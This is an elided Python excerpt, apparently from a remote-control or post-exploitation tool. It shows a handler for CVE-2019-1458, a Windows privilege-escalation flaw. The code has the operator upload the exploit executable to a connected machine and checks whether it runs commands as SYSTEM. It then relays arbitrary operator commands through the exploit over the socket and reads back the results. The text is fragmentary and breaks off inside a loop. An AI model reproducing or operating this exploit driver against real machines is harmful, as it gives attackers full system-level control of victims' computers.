...
def CVE_2019_1458(conn):
    commands = ["exit", "upload CVE_2019_1458.exe", "exploit"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;1;1mCVE-2019-1458 > \033[0m')
    print('\033[1;32;32m' + "[*] Firstly, please upload CVE_2019_1458.exe" + '\033[0m')
    ...
    while True:
        ...
        if command1 == "":
            ...
            command = "CVE_2019_1458.exe \"whoami\""
            myresult = ""
            ...
            if "authority\\system" in myresult:
                ...
                while True:
                    try:
                        system_command = prompt(formatted_text1, completer=completer, history=history)
                        if system_command == 'exit':
                            break
                        elif system_command == "":
                            continue
                        else:
                            command = 'CVE_2019_1458.exe "{}"'.format(system_command)
                            conn.sendall(command.encode("gbk"))
                            result_len = conn.recv(4)
                            real_len = struct.unpack("i", result_len)[0]
                            while True:
